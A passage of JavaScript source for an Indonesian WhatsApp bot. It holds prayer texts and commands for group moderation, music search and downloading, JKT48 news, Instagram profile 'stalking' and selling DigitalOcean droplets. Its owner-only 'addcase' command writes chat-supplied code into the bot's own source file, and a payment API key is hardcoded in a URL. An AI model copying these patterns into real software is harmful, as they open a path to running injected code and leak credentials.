      "arabic": "بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ ﴿١﴾الْحَمْدُ لِلَّـهِ رَبِّ الْعَالَمِينَ ﴿٢﴾ الرَّحْمَـٰنِ الرَّحِيمِ ﴿٣﴾ مَالِكِ يَوْمِ الدِّينِ ﴿٤﴾ إِيَّاكَ نَعْبُدُ وَإِيَّاكَ نَسْتَعِينُ ﴿٥﴾ اهْدِنَا   الصِّرَاطَ الْمُسْتَقِيمَ ﴿٦﴾ صِرَاطَ الَّذِينَ أَنْعَمْتَ عَلَيْهِمْ غَيْرِ الْمَغْضُوبِ عَلَيْهِمْ وَلَا الضَّالِّينَ ﴿٧",
      "latin": "1. Bismillahirrahmanirrahim, 2. Alhamdulillahi rabbil alamin, 3. Arrahmaanirrahiim, 4. Maaliki yaumiddiin, 5. Iyyaka nabudu waiyyaaka nastaiin, 6. Ihdinashirratal mustaqim, 7. shiratalladzina an&rsquo;amta alaihim ghairil maghduubi alaihim waladhaalin",
      "terjemahan": "1. Dengan menyebut nama Allah Yang Maha Pemurah lagi Maha Penyayang, 2. Segala puji bagi Allah, Tuhan semesta alam, 3. Maha Pemurah lagi Maha Penyayang, 4. Yang menguasai di Hari Pembalasan, 5. Hanya Engkaulah yang kami sembah, dan hanya kepada Engkaulah kami meminta pertolongan, 6. Tunjukilah kami jalan yang lurus, 7. (yaitu) Jalan orang-orang yang telah Engkau beri nikmat kepada mereka; bukan (jalan) mereka yang dimurkai dan bukan (pula jalan) mereka yang sesat"
    },
    {
      "id": 3,
      "name": "Bacaan Ruku",
      "arabic": "(3x) سُبْحَانَ رَبِّيَ الْعَظِيْمِ وَبِحَمْدِهِ",
      "latin": "Subhana Rabbiyal Adzimi Wabihamdih (3x)",
      "terjemahan": "Maha Suci Tuhanku Yang Maha Agung Dan Dengan Memuji-Nya"
    },
    {
      "id": 4,
      "name": "Bacaan Sujud",
      "arabic": "(3x) سُبْحَانَ رَبِّىَ الْأَعْلَى وَبِحَمْدِهِ",
      "latin": "Subhaana robbiyal a'la wabihamdih (3x)",
      "terjemahan": "Mahasuci Tuhanku yang Mahatinggi dan segala puji bagiNya"
    },
    {
      "id": 5,
      "name": "Bacaan Duduk Diantara Dua Sujud",
      "arabic": "رَبِّ اغْفِرْلِيْ وَارْحَمْنِيْ وَاجْبُرْنِيْ وَارْفَعْنِيْ وَارْزُقْنِيْ وَاهْدِنِيْ وَعَافِنِيْ وَاعْفُ عَنِّيْ",
      "latin": "Rabbighfirli Warhamni Wajburnii Warfaknii Wazuqnii Wahdinii Wa'aafinii Wa'fuannii",
      "terjemahan": "Ya Allah,ampunilah dosaku,belas kasihinilah aku dan cukuplah segala kekuranganku da angkatlah derajatku dan berilah rezeki kepadaku,dan berilah aku petunjuk dan berilah kesehatan padaku dan berilah ampunan kepadaku"
    },
    {
      "id": 6,
      "name": "Duduk Tasyahud Awal",
      "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ",
      "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahummasholli ala Sayyidina Muhammad",
      "terjemahan": "Segala penghormatan, keberkahan, shalawat dan kebaikan hanya bagi Allah. Semoga salam sejahtera selalu tercurahkan kepadamu wahai Nabi, demikian pula rahmat Allah dan berkahNya dan semoga salam sejahtera selalu tercurah kepada kami dan hamba-hamba Allah yang shalih. Aku bersaksi bahwa tiada ilah kecuali Allah dan aku bersaksi bahwa Muhammad adalah utusan Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad"
    },
    {
      "id": 7,
      "name": "Duduk Tasyahud Akhir",
      "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ، كَمَا صَلَّيْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ وَبَارِكْ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ كَمَا بَرَكْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ فِى الْعَالَمِيْنَ إِنَّكَ حَمِيْدٌ مَجِيْدٌ",
      "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahumma Shalli Ala Sayyidina Muhammad Wa Ala Ali Sayyidina Muhammad. Kama Shollaita Ala Sayyidina Ibrahim wa alaa aali sayyidina Ibrahim, wabaarik ala Sayyidina Muhammad Wa Alaa Ali Sayyidina Muhammad, Kama barokta alaa Sayyidina Ibrahim wa alaa ali Sayyidina Ibrahim, Fil aalamiina innaka hamiidummajid",
      "terjemahan": "Segala penghormatan yang berkat solat yang baik adalah untuk Allah. Sejahtera atas engkau wahai Nabi dan rahmat Allah serta keberkatannya. Sejahtera ke atas kami dan atas hamba-hamba Allah yang soleh. Aku bersaksi bahwa tiada Tuhan melainkan Allah dan aku bersaksi bahwasanya Muhammad itu adalah pesuruh Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad dan ke atas keluarganya. Sebagaimana Engkau selawatkan ke atas Ibrahim dan atas keluarga Ibrahim. Berkatilah ke atas Muhammad dan atas keluarganya sebagaimana Engkau berkati ke atas Ibrahim dan atas keluarga Ibrahim di dalam alam ini. Sesungguhnya Engkau Maha Terpuji lagi Maha Agung"
    },
    {
      "id": 8,
      "name": "Salam",
      "arabic": "اَلسَّلاَمُ عَلَيْكُمْ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ",
      "latin": "Assalamualaikum Warohmatullahi Wabarokatuh",
      "terjemahan": "Semoga keselamatan, rohmat dan berkah ALLAH selalu tercurah untuk kamu sekalian."
    }
  ]
}
    let bacaan = JSON.stringify(bacaanshalat)
    let json = JSON.parse(bacaan)
    let data = json.result.map((v, i) => `${i + 1}. ${v.name}\n${v.arabic}\n${v.latin}\n*Artinya:*\n_"${v.terjemahan}"_`).join('\n\n')
    let contoh = `*「 Bacaan Shalat 」*\n\n`
    m.reply(`${contoh} + ${data}`)
}
break

//======================================//
case 'antibot': {
  if (!isGroup) return m.reply('Fitur ini hanya bisa dipakai di grup!')
  if (!m.isBotAdmin) return m.reply(mess.botAdmin)
  if (!text) return m.reply(`Contoh:\n${prefix + command} on\n${prefix + command} off`)
  if (text === 'on') {
    global.antibotGroups[m.chat] = true
    m.reply('✅ Fitur *Antibot* berhasil diaktifkan di grup ini.')
  } else if (text === 'off') {
    global.antibotGroups[m.chat] = false
    m.reply('❌ Fitur *Antibot* dimatikan di grup ini.')
  } else {
    m.reply(`Gunakan format:\n${prefix + command} on\n${prefix + command} off`)
  }
}
break

case 'antipromosi':
  if (!isGroup) return m.reply('Fitur ini hanya bisa dipakai di grup!')
  if (!m.isBotAdmin) return m.reply(mess.botAdmin)
  if (!db.data) db.data = {}
  if (!db.data.chats) db.data.chats = {}
  if (!db.data.chats[m.chat]) db.data.chats[m.chat] = {}
  if (!db.data.chats[m.chat].antipromosi) db.data.chats[m.chat].antipromosi = { status: false, count: {} }
  let mode = (q || '').toLowerCase()
  if (mode === 'on') {
    if (db.data.chats[m.chat].antipromosi.status) return m.reply('Fitur anti promosi sudah aktif.')
    db.data.chats[m.chat].antipromosi.status = true
    m.reply('Fitur anti promosi telah *diaktifkan*!')
  } else if (mode === 'off') {
    if (!db.data.chats[m.chat].antipromosi.status) return m.reply('Fitur anti promosi sudah nonaktif.')
    db.data.chats[m.chat].antipromosi.status = false
    db.data.chats[m.chat].antipromosi.count = {}
    m.reply('Fitur anti promosi telah *dinonaktifkan*!')
  } else {
    m.reply(`Penggunaan:\n${prefix}antipromosi on\n${prefix}antipromosi off`)
  }
  break

case 'jkt48': {
  try {
const axios = require("axios");
    const liveRes = await axios.get('https://48intensapi.my.id/api/idnlive/jkt48');
    const liveList = liveRes.data?.data || [];
    if (!Array.isArray(liveList) || liveList.length === 0) {
      return m.reply('Tidak ada member JKT48 yang sedang live saat ini.');
    }
    for (let i = 0; i < liveList.length; i++) {
      const mbr = liveList[i];
      const nama = mbr.user.name;
      const username = mbr.user.username;
      const judul = mbr.title;
      const viewers = mbr.view_count;
      const waktu = new Date(mbr.live_at).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
      const link = `https://www.idn.app/${username}/live/${mbr.slug}`;
      const img = mbr.image;
      await conn.sendMessage(m.chat, {
        text: `*${nama} (@${username}) sedang LIVE!*\n\n` +
              `• *Judul:* ${judul}\n` +
              `• *Penonton:* ${viewers}\n` +
              `• *Sejak:* ${waktu}\n\n` +
              `Tonton sekarang:\n${link}`,
        contextInfo: {
          externalAdReply: {
            showAdAttribution: true,
            title: `${nama} sedang LIVE!`,
            body: `Judul: ${judul}`,
            mediaUrl: link,
            mediaType: 1,
            renderLargerThumbnail: true,
            thumbnailUrl: img,
            sourceUrl: link
          }
        }
      }, { quoted: m });
    }
  } catch (e) {
    console.error('ERROR JKT48:', e);
    m.reply(`Gagal mengambil data JKT48: ${e.message}`);
  }
}
  break
    
case 'addcase': {
    if (!isCreator) return m.reply(mess.owner)
    if (!text) return m.reply('Mana case nya');
    const fs = require('fs');
    const namaFile = 'biyu.js';
    const caseBaru = `${text}`;
    fs.readFile(namaFile, 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan saat membaca file:', err);
            return m.reply('Gagal membaca file');
        }
        const posisiAwal = data.indexOf("switch (command) {");
        if (posisiAwal !== -1) {
            const posisiInsert = posisiAwal + "switch (command) {".length;
            const kodeBaruLengkap = data.slice(0, posisiInsert) + '\n\n' + caseBaru + '\n' + data.slice(posisiInsert);
            fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
                if (err) {
                    m.reply('Terjadi kesalahan saat menulis file: ' + err);
                } else {
                    m.reply('Case baru berhasil ditambahkan.');
                }
            });
        } else {
            m.reply('Tidak dapat menemukan switch statement dalam file.');
        }
    });
}
break
case 'applemusic': {
  if (!q) return m.reply('Contoh:\napplemusic jakarta hari ini, 2');

  let [query, jumlah] = q.split(',');
  query = query?.trim();
  jumlah = parseInt(jumlah) || 1;
  if (!query) return m.reply('Kamu belum kasih kata kunci.\nContoh:\napplemusic jakarta hari ini, 2');

  try {
    let res = await fetch(`https://api.siputzx.my.id/api/s/applemusic?query=${encodeURIComponent(query)}&region=id`);
    let json = await res.json();
    if (!json.status || !json.data?.result?.length) return m.reply('Tidak ditemukan.');
    let result = json.data.result.slice(0, jumlah);
    for (let item of result) {
      let link = item.link;
      if (!link) continue;
      let down = await fetch(`https://www.velyn.biz.id/api/downloader/applemusic?url=${encodeURIComponent(link)}`);
      let downJson = await down.json();
      if (downJson?.status && downJson.data?.download_url) {
        let data = downJson.data;
        let caption = `*Title:* ${data.name}\n` +
                      `*Artist:* ${data.artist}\n` +
                      `*Album:* ${data.albumname}\n` +
                      `*Duration:* ${data.duration}\n` +
                      `*Link:* ${data.url}`;
        await conn.sendMessage(m.chat, {
          audio: { url: data.download_url },
          mimetype: 'audio/mp4',
          fileName: `${data.name}.m4a`,
          caption: caption,
          ptt: true,
          contextInfo: {
            externalAdReply: {
              title: data.name,
              body: data.artist,
              thumbnailUrl: data.thumb,
              mediaUrl: data.url,
              mediaType: 1,
              showAdAttribution: true,
              renderLargerThumbnail: true,
              sourceUrl: data.url
            }
          }
        }, { quoted: m });
      } else {
        let teks = `*Title:* ${item.title}\n*Artist:* ${item.artist}\n*Link:* ${item.link}`;
        if (item.image) {
          await conn.sendMessage(m.chat, {
            image: { url: item.image },
            caption: teks
          }, { quoted: m });
        } else {
          await m.reply(teks);
        }
      }
    }
  } catch (e) {
    console.error(e);
    m.reply('Terjadi kesalahan saat mengambil data.');
  }
  }
  break
case 'delcase': {
    if (!isCreator) return m.reply(mess.owner)
    if (!text) return m.reply('Masukkan nama case yang ingin dihapus')
    const fs = require('fs')
    const namaFile = 'biyu.js'
    fs.readFile(namaFile, 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan saat membaca file:', err)
            return m.reply('Gagal membaca file')
        }
        const casePattern = new RegExp(`case ['"]${text}['"]:[\\s\\S]*?break`, 'g')
        if (!casePattern.test(data)) {
            return m.reply(`Case '${text}' tidak ditemukan`)
        }
        const newContent = data.replace(casePattern, '')
        fs.writeFile(namaFile, newContent, 'utf8', (err) => {
            if (err) {
                console.error('Terjadi kesalahan saat menulis file:', err)
                return m.reply('Gagal menghapus case')
            }
            m.reply(`Case '${text}' berhasil dihapus`)
        })
    })
}
break
case 'metaimg': {
  if (!q) return m.reply(`*Format Penggunaan:*\nmetaimg prompt|mode|jumlah\n\n*Contoh:*\nmetaimg rubah lucu di hutan|image\nmetaimg cewek anime menari|animated|5\n\n*Mode yang tersedia:*\n- image\n- animated\n\n*Jumlah (opsional):* jumlah media yang ingin dikirim, default 3.`);

  let [prompt, mode, jumlah] = q.split('|').map(v => v.trim());
  mode = (mode || 'image').toLowerCase();
  jumlah = parseInt(jumlah) || 3;
  if (jumlah > 10) jumlah = 10;
  if (!['image', 'animated'].includes(mode)) {
    return m.reply(`*Mode tidak valid!*\nGunakan salah satu:\n- image\n- animated`);
  }
  await conn.sendMessage(m.chat, { react: { text: '🌹', key: m.key }});
  let loadingMsg = await conn.sendMessage(m.chat, { text: `_Sedang membuat sayang 💕😘..._` }, { quoted: m });
  let api = `https://fastrestapis.fasturl.cloud/aiimage/meta?prompt=${encodeURIComponent(prompt)}&mode=${mode}`;
  try {
    let res = await fetch(api);
    let json = await res.json();
    if (json?.status != 200) {
      await conn.sendMessage(m.chat, { text: 'Gagal generate media.' }, { quoted: m });
      return;
    }
    let mediaList = json.result?.imagine_card?.[0]?.imagine_media || [];
    if (mediaList.length == 0) {
      await conn.sendMessage(m.chat, { text: 'Tidak ada media yang tersedia.' }, { quoted: m });
      return;
    }
    let count = 0;
    for (let media of mediaList) {
      if (count >= jumlah) break;
      if (media.media_type === 'IMAGE') {
        await conn.sendMessage(m.chat, {
          image: { url: media.uri },
          caption: `Prompt: ${media.prompt || prompt}`
        }, { quoted: m });
        count++;
      } else if (media.media_type === 'VIDEO' && mode === 'animated') {
        await conn.sendMessage(m.chat, {
          video: { url: media.uri },
          caption: `Prompt: ${media.prompt || prompt}`
        }, { quoted: m });
        count++;
      }
    }
    await conn.sendMessage(m.chat, { delete: loadingMsg.key });
  } catch (err) {
    console.error(err);
    await conn.sendMessage(m.chat, { text: 'Terjadi kesalahan saat mengambil data.' }, { quoted: m });
  }
  }
  break
case 'jktnews': {
try {
const axios = require("axios")
const cheerio = require("cheerio")
const anu = await axios.get("https://jkt48.com/news/list")
const $ = cheerio.load(anu.data)
const dbres = []

$(".entry-news__list--item").each((a, b) => {
const berita = $(b).find("h3").text()
const link = "https://jkt48.com" + $(b).find("a").attr("href")
const tanggal = $(b).find("time").text()
dbres.push({ berita, link, tanggal })
})

if (dbres.length === 0) return m.reply('Gagal mengambil berita.')

m.reply(`*Berita Terbaru JKT48:*\n\n` + dbres.map(a => `Judul: ${a.berita}\nLink: ${a.link}\nTanggal: ${a.tanggal}\n`).join('\n'))

} catch (err) {
console.log(err)
m.reply('Terjadi kesalahan saat mengambil berita.')
}
}
break
//======================================//
case 'ssp2': case 'searchspotify2': {
  if (!q) return m.reply('Masukkan judul lagu!\nContoh: ssp2 Serana');
  try {
    let res = await fetch(`https://api.siputzx.my.id/api/s/spotify?query=${encodeURIComponent(q)}`);
    if (!res.ok) throw 'Gagal mengambil data dari API.';
    let json = await res.json();
    if (!json.status || !json.data || !json.data.length) return m.reply('Lagu tidak ditemukan.');
    let teks = `*Hasil Pencarian Spotify:*\nQuery: _${q}_\n\n`;
    json.data.forEach((item, index) => {
      teks += `*${index + 1}. ${item.title}*\n`;
      teks += `- Artist: ${item.artist}\n`;
      teks += `- Album: ${item.album}\n`;
      teks += `- Durasi: ${item.duration}\n`;
      teks += `- Rilis: ${item.release_date}\n`;
      teks += `- Link: ${item.track_url}\n`;
      teks += `- Preview: ${item.preview_url}\n`;
      teks += `- Thumbnail: ${item.thumbnail}\n\n`;
    });
    m.reply(teks.trim());
  } catch (e) {
    console.error(e);
    m.reply('Terjadi kesalahan saat memproses permintaan.');
  }
}
  break    
case "searchspotify": case "spotify": case "sspotify": case "ssp": {
  if (!text) return m.reply(`Example: ${prefix + command} judul lagu`);
  
  try {
    let api = await fetch(`https://api-ghostx.biz.id/api/search/spotifysearch?q=${text}`);
    let data = await api.json();
    
    if (!data.status) return m.reply('Search failed! Try again later.');
    
    let hasil = `乂 *HASIL PENCARIAN SPOTIFY* ◦\n\n`;
    for (let i = 0; i < Math.min(10, data.result.length); i++) {
      let lagu = data.result[i];
      hasil += `乂 *${i + 1}.* ${lagu.trackName}\n`;
      hasil += `乂 *Artis* : ${lagu.artistName}\n`;
      hasil += `乂 *URL* : ${lagu.externalUrl}\n\n`;
    }
    hasil += `Ketik ${prefix}spdown <url> untuk download music Spotify!`;
    
    await conn.sendMessage(m.chat, { text: hasil });
  } catch (e) {
    console.log(e);
    m.reply('Error occurred while searching!');
  }
}
break
case 'igstalk': {
 if (!q) return m.reply('Masukkan username Instagram!\nContoh: igstalk biyustoree')
 let username = q.trim().split(" ")[0]
 let res = await fetch(`https://fastrestapis.fasturl.cloud/stalk/instagram?username=${username}`)
 if (!res.ok) return m.reply('Gagal mengambil data.')
 let json = await res.json()
 if (json.status != 200) return m.reply('User tidak ditemukan atau error.')
 let hasil = json.result
 let teks = `*INSTAGRAM STALKER*\n\n`
 teks += `*Nama:* ${hasil.name || '-'}\n`
 teks += `*Bio:* ${hasil.description || '-'}\n`
 teks += `*Followers:* ${hasil.followers}\n`
 teks += `*Jumlah Upload:* ${hasil.uploads}\n`
 teks += `*Engagement Rate:* ${hasil.engagementRate}\n`
 teks += `*Aktivitas Rata-rata:* ${hasil.averageActivity}\n`
 teks += `*Post per Minggu:* ${hasil.postsPerWeek}\n`
 teks += `*Post per Bulan:* ${hasil.postsPerMonth}\n`
 teks += `*Jumlah Post:* ${hasil.amountOfPosts}\n`
 teks += `*Waktu Post Populer:* ${hasil.mostPopularPostTime}\n\n`
 teks += `*Post Paling Banyak Komentar:*\n`
 hasil.mostCommentedPosts.slice(0, 5).forEach((post, i) => {
 teks += `${i+1}. ❤️ ${post.likes} | 💬 ${post.comments}\n↳ ${post.link}\n`
 })
 teks += `\n*Post Paling Banyak Like:*\n`
 hasil.mostLikedPosts.slice(0, 5).forEach((post, i) => {
 teks += `${i+1}. ❤️ ${post.likes} | 💬 ${post.comments}\n↳ ${post.link}\n`
 })
 m.reply(teks)
}
break
case 'cekganteng':
case 'cekcantik': {
  const teks = text ? text.trim() : ''
  let targetJid
  let targetName
  if (m.mentionedJid && m.mentionedJid.length > 0) {
    targetJid = m.mentionedJid[0]
    targetName = await conn.getName(targetJid)
  } else if (/^\d{5,}$/.test(teks)) {
    targetJid = teks.includes('@s.whatsapp.net') ? teks : teks + '@s.whatsapp.net'
    targetName = await conn.getName(targetJid).catch(() => teks)
  } else if (teks) {
    targetJid = m.sender
    targetName = teks
  } else {
    targetJid = m.sender
    targetName = await conn.getName(m.sender)
  }
  const score = Math.floor(Math.random() * 100) + 1
  let komentar, emoji
  if (command == 'cekganteng') {
    if (score >= 90) {
      komentar = 'Gantengnya overload! Bikin cewek-cewek auto salfok!'
      emoji = '🔥👑💯'
    } else if (score >= 75) {
      komentar = 'Fix calon idol K-Pop, visualnya ngalahin artis!'
      emoji = '✨🧸💘'
    } else if (score >= 60) {
      komentar = 'Lumayanlah, bisa jadi cover boy majalah sekolah.'
      emoji = '😎👍'
    } else if (score >= 40) {
      komentar = 'Masih bisa ganteng... asal pake lighting dan filter 10 lapis.'
      emoji = '🤔🧼📸'
    } else if (score >= 20) {
      komentar = 'Gantengnya kayak sinyal 1 bar di hutan.'
      emoji = '📵🌲😂'
    } else {
      komentar = 'Waduh... Gantengnya disembunyiin kali ya?'
      emoji = '🥲💀👻'
    }
    const result = `*Cek Ganteng Untuk:* ${targetName}\n\n` +
                   `*Nilai Ganteng:* *${score}/100* ${emoji}\n\n` +
                   `*Komentar:* ${komentar}`
    conn.sendMessage(m.chat, {
      text: result,
      mentions: [targetJid],
    }, { quoted: m })
  } else if (command == 'cekcantik') {
    if (score >= 90) {
      komentar = 'Kecantikannya bikin bunga iri dan rembulan minder.'
      emoji = '🌷✨🌙'
    } else if (score >= 75) {
      komentar = 'Manisnya kayak senja di tepi pantai, adem banget dipandang.'
      emoji = '🌅🍬🌸'
    } else if (score >= 60) {
      komentar = 'Pesonanya sederhana tapi ngena, kayak kopi di pagi hari.'
      emoji = '☕🌼😊'
    } else if (score >= 40) {
      komentar = 'Cantik sih... tapi kayak koneksi WiFi, kadang ada kadang hilang.'
      emoji = '📶🤏😂'
    } else if (score >= 20) {
      komentar = 'Mungkin cantiknya perlu di-update ke versi terbaru.'
      emoji = '🔄🤖🫣'
    } else {
      komentar = 'Kecantikannya kayak teka-teki, masih misteri.'
      emoji = '🕵️‍♀️❓🌑'
    }
    const result = `*Cek Cantik Untuk:* ${targetName}\n\n` +
                   `*Skor Kecantikan:* *${score}/100* ${emoji}\n\n` +
                   `*Komentar:* ${komentar}`
    conn.sendMessage(m.chat, {
      text: result,
      mentions: [targetJid],
    }, { quoted: m })
  }
}
break
case "sdown": case "spdown":
case "spotifydown": 
case "downspotify": {
  if (!text) return m.reply(`Example: ${prefix + command} url spotify`);
  
  m.reply('⏳ Tunggu sebentar kak, sedang diproses...');
  
  try {
    console.log(`🔍 Fetching data from: ${text}`);
const axios = require('axios');
    const response = await axios.post('https://spotymate.com/api/download-track',
      { url: text },
      {
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36',
          'Referer': 'https://spotymate.com/'
        }
      }
    );

    if (response.data && response.data.file_url) {
      let caption = `乂 *SPOTIFY DOWNLOADER* ◦\n\n`;
      caption += `乂 *Status* : Berhasil ✅\n`;
      caption += `乂 *URL* : ${text}\n`;
      
      await conn.sendMessage(m.chat, { text: caption });
      await conn.sendMessage(m.chat, { 
        audio: { url: response.data.file_url }, 
        mimetype: 'audio/mpeg',
        fileName: 'spotify_download.mp3'
      });
    } else {
      m.reply('❌ Tidak dapat menemukan link unduhan!');
    }
  } catch (error) {
    console.log(error);
    m.reply(`❌ Error: ${error.message}`);
  }
}
break

case "gimage":
case "simg":
case "searchimage":
  {
    if (!text) return m.reply('Masukkan kata kunci pencarian!')
    await conn.sendMessage(m.chat, { react: { text: '🔍', key: m.key } })
    try {
      let response = await fetchJson(`https://api-rest-rizzkyxofc.vercel.app/api/search/gimage?q=${text}`)
      if (!response.status) return m.reply("Error")
      let total = 0
      let aray = response.result.length < 20 ? response.result : response.result.slice(0, 20)
      let cards = []
      for (let i of aray) {
        let imgsc = await prepareWAMessageMedia({ image: { url: i.url } }, { upload: conn.waUploadToServer })
        cards.push({
          header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `Foto Ke ${++total}`,
            hasMediaAttachment: true,
            ...imgsc
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: [
              {
              name: "cta_copy",
                            buttonParamsJson: `{
                                "display_text": "Salin Link",
                                "copy_text": "${i.url}"
                            }`
              }
            ]
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: `Link: ${i.url}`
          })
        })
      }
      const msg = await generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `🔎 *Hasil pencarian gambar untuk ${text}*`
              }),
              carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                cards: cards
              })
            })
          }
        }
      }, {
        userJid: m.sender,
        quoted: m
      })
      conn.relayMessage(m.chat, msg.message, { messageId: msg.key.id })
      await conn.sendMessage(m.chat, { react: { text: '', key: m.key } })
    } catch (error) {
      console.error(error)
      return m.reply('Terjadi kesalahan saat mencari gambar!')
    }
  }
  break
  case 'blacklist': case 'bl':
if (!isCreator) return Reply(mess.owner)
  const [yubi, ...args] = text.trim().split(' ');
  const nomor = m.quoted ? m.quoted.sender.replace(/[^0-9]/g, '') : argsbiyuoffc.join('')?.replace(/[^0-9]/g, '');
  if (!['add', 'und'].includes(yubi)) return m.reply('Format salah!\n\nContoh:\nblacklist add 628xxx/tag\nblacklist und 628xxx/tag');
  let bl = loadBlacklist();
  if (yubi === 'add') {
    if (bl.includes(nomor)) return m.reply('Orang ini sudah di blacklist.');
    bl.push(nomor);
    saveBlacklist(bl);
    m.reply(`✅ ${nomor} berhasil di *blacklist*.`);
  } else if (yubi === 'und') {
    if (!bl.includes(nomor)) return m.reply('Nomor ini tidak ada di blacklist.');
    bl = bl.filter(n => n !== nomor);
    saveBlacklist(bl);
    m.reply(`✅ ${nomor} berhasil dihapus dari *blacklist*.`);
  }
  break
case 'owneroff': {
if (!isCreator) return Reply(mess.owner)
    if (argsbiyuoffc[0] === 'on') {
        global.db.settings.owneroffmode = true;
        conn.sendMessage(m.chat, { text: "Bot Owner sedang OFFLINE. Semua chat selain creator akan mendapatkan auto reply ini." }, { quoted: qtext2 });
        break;
    }
    if (argsbiyuoffc[0] === 'off') {
        global.db.settings.owneroffmode = false;
        conn.sendMessage(m.chat, { text: "Bot Owner sudah ONLINE kembali." }, { quoted: qtext2 });
        break;
    }
    conn.sendMessage(m.chat, { text: "Perintah tidak valid! Gunakan: *owneroff on* atau *owneroff off*." }, { quoted: qtext2 });
    }
    break
case "buydo": case "buydigitalocean": {
if (stokdo.length < 1) return m.reply("Maaf stok do sedang tidak tersedia")
if (m.isGroup) return m.reply("Pembelian digitalocean hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!text) {
let butnya = []
let urutt = 0
for (let gg of stokdo) {
butnya.push({
title: `${gg.droplet} Droplet`, 
description: `Rp${await toIDR(gg.harga)}`, 
id: `${prefix}buydo ${urutt += 1}`
})
}
return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Droplet',
          sections: [
            {
              title: 'List Stok Digitalocean',
              highlight_label: 'Recommended',
              rows: butnya
            }
          ]
        })
      }
      }
  ],
  footer: `© WhatsApp Botz`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Stock Digitalocean\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}

const donya = stokdo[Number(text) - 1]
let us = crypto.randomBytes(4).toString('hex')
let Obj = {}
Obj.harga = donya.harga
Obj.akun = donya
const UrlQr = global.qrisOrderKuota
const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const axios = require('axios');
const get = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/createpayment?apikey=new2025&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Dogital Ocean ${donya.droplet} Drop
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *batalbeli* untuk membatalkan
`
let msgQr = await conn.sendMessage(m.chat, {
  footer: `${botname}`,
  buttons: [
    {
      buttonId: `${prefix}batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
